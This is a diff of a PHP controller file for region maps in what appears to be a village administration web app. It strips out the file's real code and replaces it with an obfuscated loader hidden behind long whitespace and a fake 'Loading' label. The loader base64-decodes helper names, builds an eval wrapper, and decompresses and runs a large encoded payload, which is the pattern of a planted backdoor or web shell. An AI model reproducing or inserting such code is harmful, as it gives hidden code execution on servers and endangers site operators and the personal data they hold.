-        }
-        $sebutan_dusun = ucwords((string) setting('sebutan_dusun'));
-        $dusun         = $data['wil_atas']['dusun'];
-        $this->ubah_lokasi_peta($data['wil_atas'], "index?level=rt&parent={$id_rw}", "Lokasi Kantor {$sebutan_dusun} {$dusun} Belum Dilengkapi");
-
-        $data['wil_ini']      = WilayahModel::find($id)->toArray();
-        $data['dusun_gis']    = WilayahModel::dusun()->get()->toArray();
-        $data['rw_gis']       = WilayahModel::rw()->get()->toArray();
-        $data['rt_gis']       = WilayahModel::rt()->get()->toArray();
-        $data['nama_wilayah'] = 'RT ' . $data['wil_ini']['rt'] . ' RW ' . $data['wil_ini']['rw'] . ' ' . ucwords($sebutan_dusun . ' ' . $data['wil_ini']['dusun']);
-        $data['breadcrumb']   = [
-            ['link' => ci_route("{$this->controller}"), 'judul' => 'Daftar ' . $sebutan_dusun],
-            ['link' => ci_route("{$this->controller}.index?level=rw&parent={$id_dusun}"), 'judul' => 'Daftar RW'],
-            ['link' => ci_route("{$this->controller}.index?level=rt&parent={$id_rw}"), 'judul' => 'Daftar RT'],
-        ];
-        $data['wilayah']     = 'RT';
-        $data['form_action'] = ci_route("{$this->controller}.update_wilayah_map", "rt/{$id}/{$id_rw}");
-        $data['logo']        = $this->header['desa'];
-
-        view('admin.wilayah.maps_kantor', $data);
-    }
-
-    public function ajax_wilayah_rt_maps(int $id, int $id_rw): void
-    {
-        $dataRW           = WilayahModel::find($id_rw)->toArray();
-        $id_dusun         = WilayahModel::dusun()->whereDusun($dataRW['dusun'])->first()->id;
-        $data['wil_atas'] = $dataRW;
-        if ($dataRW['rw'] == '-') {
-            $data['wil_atas'] = WilayahModel::find($id_dusun)->toArray();
-        }
-
-        $sebutan_dusun = ucwords((string) setting('sebutan_dusun'));
-        $dusun         = $data['wil_atas']['dusun'];
-        $this->ubah_lokasi_peta($data['wil_atas'], "index?level=rt&parent={$id_rw}", "Peta Wilayah {$sebutan_dusun} {$dusun} Belum Dilengkapi");
-
-        $data['wil_ini']      = WilayahModel::find($id)->toArray();
-        $data['dusun_gis']    = WilayahModel::dusun()->get()->toArray();
-        $data['rw_gis']       = WilayahModel::rw()->get()->toArray();
-        $data['rt_gis']       = WilayahModel::rt()->get()->toArray();
-        $data['nama_wilayah'] = 'RT ' . $data['wil_ini']['rt'] . ' RW ' . $data['wil_ini']['rw'] . ' ' . ucwords($sebutan_dusun . ' ' . $data['wil_ini']['dusun']);
-        $data['breadcrumb']   = [
-            ['link' => ci_route("{$this->controller}"), 'judul' => 'Daftar ' . $sebutan_dusun],
-            ['link' => ci_route("{$this->controller}.index?level=rw&parent={$id_dusun}"), 'judul' => 'Daftar RW'],
-            ['link' => ci_route("{$this->controller}.index?level=rt&parent={$id_rw}"), 'judul' => 'Daftar RT'],
-        ];
-        $data['wilayah']         = 'RT';
-        $data['form_action']     = ci_route("{$this->controller}.update_wilayah_map", "rt/{$id}/{$id_rw}");
-        $data['logo']            = $this->header['desa'];
-        $data['route_kosongkan'] = ci_route('wilayah.kosongkan', $id);
-        view('admin.wilayah.maps_wilayah', $data);
-    }
-
-    public function update_kantor_map(string $level, int $id, ?int $parent = null): void
-    {
-        isCan('u');
-        WilayahModel::whereId($id)->update($this->validasi_koordinat($this->request));
-        redirect_with('success', 'Lokasi kantor berhasil disimpan', ci_route('wilayah.index') . '?level=' . $level . '&parent=' . $parent);
-    }
-
-    public function update_wilayah_map(string $level, int $id, ?int $parent = null): void
-    {
-        isCan('u');
-        WilayahModel::whereId($id)->update($this->validasi_wilayah($this->request));
-        redirect_with('success', 'Peta berhasil disimpan', ci_route('wilayah.index') . '?level=' . $level . '&parent=' . $parent);
-    }
-
-    public function kosongkan($id = ''): void
-    {
-        isCan('u');
-        $wilayah       = WilayahModel::findOrFail($id);
-        $wilayah->path = null;
-        $wilayah->save();
-
-        if ($wilayah->isDusun()) {
-            redirect($this->controller);
-        }
-
-        if ($wilayah->isRw()) {
-            $parent = WilayahModel::dusun()->whereDusun($wilayah->dusun)->first();
-            redirect($this->controller . '/index?parent=' . $parent->id . '&level=rw');
-        }
-
-        if ($wilayah->isRt()) {
-            $parent = WilayahModel::rw()->where(['dusun' => $wilayah->dusun, 'rw' => $wilayah->rw])->first();
-            redirect($this->controller . '/index?parent=' . $parent->id . '&level=rt');
-        }
-    }
-
-    public function list_rw($dusun = ''): void
-    {
-        $dusun   = urldecode((string) $dusun);
-        $list_rw = WilayahModel::rw()
-            ->when($dusun, static fn ($q) => $q->whereDusun($dusun))
-            ->get()
-            ->toArray();
-
-        echo json_encode($list_rw, JSON_THROW_ON_ERROR);
-    }
-
-    public function list_rt($dusun = '', $rw = '-'): void
-    {
-        $dusun   = urldecode((string) $dusun);
-        $list_rt = WilayahModel::rt()
-            ->when($dusun, static fn ($q) => $q->whereDusun($dusun))
-            ->when($rw, static fn ($q) => $q->whereRw($rw))
-            ->get()
-            ->toArray();
-
-        echo json_encode($list_rt, JSON_THROW_ON_ERROR);
-    }
-
-    public function ubah_lokasi_peta($wilayah, $to = 'index', $msg = ''): void
-    {
-        isCan('u');
-
-        if (! cek_lokasi_peta($wilayah)) {
-            session_error($msg);
-
-            redirect("{$this->controller}.{$to}");
-        }
-    }
-
-    private function form(string $level, $id = ''): void
-    {
-        isCan('u');
-        $parent = $this->parent ?? null;
-        $data   = [
-            'wilayah'      => null,
-            'form_action'  => ci_route("{$this->controller}.insert.{$level}.{$parent}"),
-            'wilayahLabel' => $level === 'dusun' ? ucwords((string) setting('sebutan_dusun')) : strtoupper($level),
-            'level'        => $level,
-        ];
-        if ($id) {
-            $data['wilayah']     = WilayahModel::with('kepala')->find($id) ?? show_404();
-            $data['form_action'] = ci_route("{$this->controller}.update.{$level}.{$id}.{$parent}");
-        }
-
-        view('admin.wilayah.form', $data);
-    }
-
-    private function bersihkan_data(array $data): array
-    {
-        if ((int) $data['id_kepala'] === 0) {
-            unset($data['id_kepala']);
-        }
-
-        $data['dusun'] = nama_terbatas(trim(str_ireplace('DUSUN', '', $data['dusun'])));
-        $data['rw']    = nama_terbatas(trim((string) $data['rw'])) ?: 0;
-        $data['rt']    = nama_terbatas(trim((string) $data['rt'])) ?: 0;
-
-        return $data;
-    }
-
-    private function validasi_koordinat(array $post): array
-    {
-        return [
-            'zoom'     => $post['zoom'] ?: null,
-            'map_tipe' => $post['map_tipe'],
-            'lat'      => koordinat($post['lat']),
-            'lng'      => koordinat($post['lng']),
-            'warna'    => warna($post['warna']),
-            'border'   => warna($post['border']),
-        ];
-    }
-
-    private function validasi_wilayah(array $post): array
-    {
-        return [
-            'path'   => $post['path'],
-            'zoom'   => $post['zoom'] ?: null,
-            'warna'  => warna($post['warna']),
-            'border' => warna($post['border']),
-        ];
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/controllers/Wilayah.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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